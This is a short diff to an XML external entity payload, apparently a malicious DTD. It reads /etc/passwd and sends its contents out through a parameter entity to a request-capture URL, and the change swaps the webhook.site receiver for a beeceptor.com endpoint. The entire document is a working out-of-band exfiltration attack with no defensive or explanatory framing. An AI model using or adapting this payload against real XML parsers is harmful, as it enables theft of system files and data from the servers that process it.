@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/?d=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://wetakush.free.beeceptor.com/?d=%file;'>">
 %eval;
 %exfil;
